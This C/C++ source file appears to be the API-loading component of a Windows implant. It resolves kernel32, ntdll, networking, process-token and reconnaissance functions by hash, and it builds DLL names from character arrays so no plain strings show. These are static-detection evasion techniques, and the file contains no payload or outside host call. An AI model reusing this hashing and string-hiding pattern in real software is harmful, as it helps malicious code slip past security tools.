#include "ApiLoader.h"
#include "ProcLoader.h"

#pragma intrinsic(memset)
#pragma function(memset)
void* __cdecl memset(void* Destination, int Value, size_t Size)
{
	unsigned char* p = (unsigned char*)Destination;
	while (Size > 0) {
		*p = (unsigned char)Value;
		p++;
		Size--;
	}
	return Destination;
}

#pragma intrinsic(memcpy)
#pragma function(memcpy)
void* __cdecl memcpy(void* Dst, const void* Src, size_t Size)
{
	unsigned char* p = (unsigned char*)Dst;
	unsigned char* q = (unsigned char*)Src;
	while (Size > 0) {
		*p++ = *q++;
		Size--;
	}
	return Dst;
}

WINAPIFUNC* ApiWin = NULL;
NTAPIFUNC*  ApiNt = NULL;

BOOL ApiLoad()
{
	HMODULE hKernel32Module = GetModuleAddress(HASH_LIB_KERNEL32);

	decltype(LocalAlloc)* allocProc = (decltype(LocalAlloc)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALALLOC);

	ApiWin = (WINAPIFUNC*) allocProc(LPTR, sizeof(WINAPIFUNC));
	ApiNt  = (NTAPIFUNC*)  allocProc(LPTR, sizeof(NTAPIFUNC));

	if ( ApiWin && hKernel32Module) {
		// kernel32
		ApiWin->LoadLibraryA = (decltype(LoadLibraryA)*)GetSymbolAddress(hKernel32Module, HASH_FUNC_LOADLIBRARYA);

		ApiWin->CopyFileA				= (decltype(CopyFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_COPYFILEA);
		ApiWin->CreateDirectoryA		= (decltype(CreateDirectoryA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEDIRECTORYA);
		ApiWin->CreateFileA				= (decltype(CreateFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEFILEA);
		ApiWin->CreatePipe				= (decltype(CreatePipe)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEPIPE);
		ApiWin->CreateProcessA			= (decltype(CreateProcessA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_CREATEPROCESSA);
		ApiWin->DeleteFileA				= (decltype(DeleteFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_DELETEFILEA);
		ApiWin->GetExitCodeProcess		= (decltype(GetExitCodeProcess)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETEXITCODEPROCESS);
		ApiWin->GetExitCodeThread		= (decltype(GetExitCodeThread)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETEXITCODETHREAD);
		ApiWin->FindClose				= (decltype(FindClose)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDCLOSE);
		ApiWin->FindFirstFileA			= (decltype(FindFirstFileA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDFIRSTFILEA);
		ApiWin->FindNextFileA			= (decltype(FindNextFileA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_FINDNEXTFILEA);
		ApiWin->FreeLibrary				= (decltype(FreeLibrary)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_FREELIBRARY);
		ApiWin->GetACP					= (decltype(GetACP)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETACP);
		ApiWin->GetComputerNameExA		= (decltype(GetComputerNameExA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETCOMPUTERNAMEEXA);
		ApiWin->GetCurrentDirectoryA	= (decltype(GetCurrentDirectoryA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETCURRENTDIRECTORYA);
		ApiWin->GetDriveTypeA			= (decltype(GetDriveTypeA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETDRIVETYPEA);
		ApiWin->GetFileSize				= (decltype(GetFileSize)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFILESIZE);
		ApiWin->GetFileAttributesA		= (decltype(GetFileAttributesA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFILEATTRIBUTESA);
		ApiWin->GetFullPathNameA		= (decltype(GetFullPathNameA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETFULLPATHNAMEA);
		ApiWin->GetLastError			= (decltype(GetLastError)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLASTERROR);
		ApiWin->GetLogicalDrives		= (decltype(GetLogicalDrives)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETLOGICALDRIVES);
		ApiWin->GetOEMCP				= (decltype(GetOEMCP)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETOEMCP);
		ApiWin->GetModuleBaseNameA		= (decltype(GetModuleBaseNameA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_K32GETMODULEBASENAMEA);
		ApiWin->GetModuleHandleA		= (decltype(GetModuleHandleA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETMODULEHANDLEA);
		ApiWin->GetProcAddress			= (decltype(GetProcAddress)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETPROCADDRESS);
		ApiWin->GetTickCount			= (decltype(GetTickCount)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_GETTICKCOUNT);
		ApiWin->GetTimeZoneInformation	= (decltype(GetTimeZoneInformation)*)  GetSymbolAddress(hKernel32Module, HASH_FUNC_GETTIMEZONEINFORMATION);
		ApiWin->HeapAlloc				= (decltype(HeapAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPALLOC);
		ApiWin->HeapCreate				= (decltype(HeapCreate)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPCREATE);
		ApiWin->HeapDestroy				= (decltype(HeapDestroy)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPDESTROY);
		ApiWin->HeapReAlloc				= (decltype(HeapReAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPREALLOC);
		ApiWin->HeapFree				= (decltype(HeapFree)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_HEAPFREE);
		ApiWin->IsWow64Process			= (decltype(IsWow64Process)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_ISWOW64PROCESS);
		ApiWin->LocalAlloc				= allocProc;
		ApiWin->LocalFree				= (decltype(LocalFree)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALFREE);
		ApiWin->LocalReAlloc			= (decltype(LocalReAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_LOCALREALLOC);
		ApiWin->MoveFileA				= (decltype(MoveFileA)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_MOVEFILEA);
		ApiWin->MultiByteToWideChar		= (decltype(MultiByteToWideChar)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_MULTIBYTETOWIDECHAR);
		ApiWin->PeekNamedPipe			= (decltype(PeekNamedPipe)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_PEEKNAMEDPIPE);
		ApiWin->ReadFile                = (decltype(ReadFile)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_READFILE);
		ApiWin->RemoveDirectoryA        = (decltype(RemoveDirectoryA)*)		   GetSymbolAddress(hKernel32Module, HASH_FUNC_REMOVEDIRECTORYA);
		ApiWin->RtlCaptureContext       = (decltype(RtlCaptureContext)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_RTLCAPTURECONTEXT);
		ApiWin->SetCurrentDirectoryA    = (decltype(SetCurrentDirectoryA)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_SETCURRENTDIRECTORYA);
		ApiWin->SetNamedPipeHandleState = (decltype(SetNamedPipeHandleState)*) GetSymbolAddress(hKernel32Module, HASH_FUNC_SETNAMEDPIPEHANDLESTATE);
		ApiWin->Sleep					= (decltype(Sleep)*)				   GetSymbolAddress(hKernel32Module, HASH_FUNC_SLEEP);
		ApiWin->VirtualAlloc			= (decltype(VirtualAlloc)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_VIRTUALALLOC);
		ApiWin->VirtualFree				= (decltype(VirtualFree)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_VIRTUALFREE);
		ApiWin->WideCharToMultiByte		= (decltype(WideCharToMultiByte)*)	   GetSymbolAddress(hKernel32Module, HASH_FUNC_WIDECHARTOMULTIBYTE);
		ApiWin->WriteFile				= (decltype(WriteFile)*)			   GetSymbolAddress(hKernel32Module, HASH_FUNC_WRITEFILE);

		// iphlpapi
		CHAR iphlpapi_c[] = {'I', 'p', 'h', 'l', 'p', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0};
		HMODULE hIphlpapiModule = ApiWin->LoadLibraryA(iphlpapi_c);
		if (hIphlpapiModule) {
			ApiWin->GetAdaptersInfo = (decltype(GetAdaptersInfo)*) GetSymbolAddress(hIphlpapiModule, HASH_FUNC_GETADAPTERSINFO);
		}

		// advapi32
		CHAR advapi32_c[] = { 'A', 'd', 'v', 'a', 'p', 'i', '3', '2', '.', 'd', 'l', 'l', 0 };
		HMODULE hAdvapi32Module = ApiWin->LoadLibraryA(advapi32_c);
		if (hAdvapi32Module) {
			ApiWin->GetTokenInformation = (decltype(GetTokenInformation)*) GetSymbolAddress(hAdvapi32Module, HASH_FUNC_GETTOKENINFORMATION);
			ApiWin->GetUserNameA		= (decltype(GetUserNameA)*)		   GetSymbolAddress(hAdvapi32Module, HASH_FUNC_GETUSERNAMEA);
			ApiWin->LookupAccountSidA   = (decltype(LookupAccountSidA)*)   GetSymbolAddress(hAdvapi32Module, HASH_FUNC_LOOKUPACCOUNTSIDA);
		}

		// msvcrt
		CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', '.', 'd', 'l', 'l', 0 };
		HMODULE hMsvcrtModule = ApiWin->LoadLibraryA(msvcrt_c);
		if (hMsvcrtModule) {
#if defined(DEBUG)
			ApiWin->printf = (printf_t)GetSymbolAddress(hMsvcrtModule, HASH_FUNC_PRINTF);
#endif
			ApiWin->vsnprintf = (vsnprintf_t)GetSymbolAddress(hMsvcrtModule, HASH_FUNC_VSNPRINTF);
		}

		// Ws2_32
		CHAR ws2_32_c[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
		HMODULE hWs2_32Module = ApiWin->LoadLibraryA(ws2_32_c);
		if (hWs2_32Module) {
			ApiWin->WSAStartup      = (decltype(WSAStartup)*)      GetSymbolAddress(hWs2_32Module, HASH_FUNC_WSASTARTUP);
			ApiWin->WSACleanup      = (decltype(WSACleanup)*)      GetSymbolAddress(hWs2_32Module, HASH_FUNC_WSACLEANUP);
			ApiWin->WSAGetLastError = (decltype(WSAGetLastError)*) GetSymbolAddress(hWs2_32Module, HASH_FUNC_WSAGETLASTERROR);
			ApiWin->gethostbyname   = (decltype(gethostbyname)*)   GetSymbolAddress(hWs2_32Module, HASH_FUNC_GETHOSTBYNAME);
			ApiWin->socket			= (decltype(socket)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_SOCKET);
			ApiWin->ioctlsocket		= (decltype(ioctlsocket)*)     GetSymbolAddress(hWs2_32Module, HASH_FUNC_IOCTLSOCKET);
			ApiWin->connect			= (decltype(connect)*)         GetSymbolAddress(hWs2_32Module, HASH_FUNC_CONNECT);
			ApiWin->closesocket		= (decltype(closesocket)*)     GetSymbolAddress(hWs2_32Module, HASH_FUNC_CLOSESOCKET);
			ApiWin->select			= (decltype(select)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_SELECT);
			ApiWin->__WSAFDIsSet    = (decltype(__WSAFDIsSet)*)    GetSymbolAddress(hWs2_32Module, HASH_FUNC___WSAFDISSET);
			ApiWin->shutdown		= (decltype(shutdown)*)        GetSymbolAddress(hWs2_32Module, HASH_FUNC_SHUTDOWN);
			ApiWin->recv     		= (decltype(recv)*)            GetSymbolAddress(hWs2_32Module, HASH_FUNC_RECV);
			ApiWin->recvfrom        = (decltype(recvfrom)*)        GetSymbolAddress(hWs2_32Module, HASH_FUNC_RECVFROM);
			ApiWin->send     		= (decltype(send)*)            GetSymbolAddress(hWs2_32Module, HASH_FUNC_SEND);
			ApiWin->sendto     		= (decltype(sendto)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_SENDTO);
			ApiWin->accept     		= (decltype(accept)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_ACCEPT);
			ApiWin->listen     		= (decltype(listen)*)          GetSymbolAddress(hWs2_32Module, HASH_FUNC_LISTEN);
			ApiWin->bind     		= (decltype(bind)*)            GetSymbolAddress(hWs2_32Module, HASH_FUNC_BIND);
		}
	}
	else {
		return FALSE;
	}

	if (ApiNt) {
		HMODULE hNtdllModule = GetModuleAddress(HASH_LIB_NTDLL);
		if ( hNtdllModule ) {
			ApiNt->NtClose                   = (decltype(NtClose)*)					  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTCLOSE);
			ApiNt->NtContinue                = (decltype(NtContinue)*)				  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTCONTINUE);
			ApiNt->NtFreeVirtualMemory       = (decltype(NtFreeVirtualMemory)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTFREEVIRTUALMEMORY);
			ApiNt->NtQueryInformationProcess = (decltype(NtQueryInformationProcess)*) GetSymbolAddress(hNtdllModule, HASH_FUNC_NTQUERYINFORMATIONPROCESS);
			ApiNt->NtQuerySystemInformation  = (decltype(NtQuerySystemInformation)*)  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTQUERYSYSTEMINFORMATION);
			ApiNt->NtOpenProcess             = (decltype(NtOpenProcess)*)			  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENPROCESS);
			ApiNt->NtOpenProcessToken        = (decltype(NtOpenProcessToken)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTOPENPROCESSTOKEN);
			ApiNt->NtTerminateThread         = (decltype(NtTerminateThread)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTTERMINATETHREAD);
			ApiNt->NtTerminateProcess        = (decltype(NtTerminateProcess)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_NTTERMINATEPROCESS);
			ApiNt->RtlGetVersion             = (decltype(RtlGetVersion)*)			  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLGETVERSION);
			ApiNt->RtlExitUserThread         = (decltype(RtlExitUserThread)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLEXITUSERTHREAD);
			ApiNt->RtlExitUserProcess        = (decltype(RtlExitUserProcess)*)		  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLEXITUSERPROCESS);
			ApiNt->RtlIpv4StringToAddressA   = (decltype(RtlIpv4StringToAddressA)*)	  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLIPV4STRINGTOADDRESSA);
			ApiNt->RtlRandomEx               = (decltype(RtlRandomEx)*)				  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLRANDOMEX);
			ApiNt->RtlNtStatusToDosError     = (decltype(RtlNtStatusToDosError)*)	  GetSymbolAddress(hNtdllModule, HASH_FUNC_RTLNTSTATUSTODOSERROR);
		}
		else {
			return FALSE;
		}
	}
	else {
		return FALSE;
	}
	return TRUE;
}
